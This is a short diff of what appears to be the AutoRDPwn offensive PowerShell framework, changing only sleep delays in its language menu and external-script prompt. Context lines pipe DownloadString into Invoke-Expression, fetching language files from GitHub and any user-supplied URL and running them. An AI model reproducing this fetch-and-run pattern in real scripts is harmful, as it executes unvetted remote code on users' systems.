@@ -103,7 +103,7 @@ function Remove-Exclusions {
     if ($langui -like 'it*') { $input = '5' ; $language = 'Italian' ; [Console]::SetCursorPosition(0,"$cursortop") ; Write-Host "Choose your language:` " -NoNewLine -ForegroundColor Gray ; Write-Host "5" }
     if ($langui -like 'ru*') { $input = '6' ; $language = 'Russian' ; [Console]::SetCursorPosition(0,"$cursortop") ; Write-Host "Choose your language:` " -NoNewLine -ForegroundColor Gray ; Write-Host "6" }
     if ($langui -like 'pt*') { $input = '7' ; $language = 'Portuguese' ; [Console]::SetCursorPosition(0,"$cursortop") ; Write-Host "Choose your language:` " -NoNewLine -ForegroundColor Gray ; Write-Host "7" }}
-    else { Write-Host ; Write-Host "Wrong option, please try again" -ForegroundColor Red ; Start-Sleep -milliseconds 2500 }} else { continue }}} until ($input -in '1','2','3','4','5','6','7','X')}
+    else { Write-Host ; Write-Host "Wrong option, please try again" -ForegroundColor Red ; Start-Sleep -milliseconds 1500 }} else { continue }}} until ($input -in '1','2','3','4','5','6','7','X')}
 
     if($lang -like '-lang') { $language=$args[3] }
     if($language -in 'English') { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Languages/English.ps1') }
@@ -481,7 +481,7 @@ function Remove-Exclusions {
         
         if($othermodule -like '3') { Write-Host "$txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2500 ; Write-Host
         do { Write-Host "$txt73" -NoNewLine -ForegroundColor Gray ; $externalscript = $Host.UI.ReadLine() ; Write-Host
-        if(!$externalscript) { Write-Host "$txt6" -ForegroundColor Red ; Write-Host ; Start-Sleep -milliseconds 2500 }}
+        if(!$externalscript) { Write-Host "$txt6" -ForegroundColor Red ; Write-Host ; Start-Sleep -milliseconds 1500 }}
         until ( $externalscript) ; Write-Host "$txt74" -NoNewLine -ForegroundColor Gray ; $externalfunction = $Host.UI.ReadLine() 
         $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host
         if($externalscript -like 'http*') { Invoke-Expression (New-Object Net.WebClient).DownloadString("$externalscript") } 
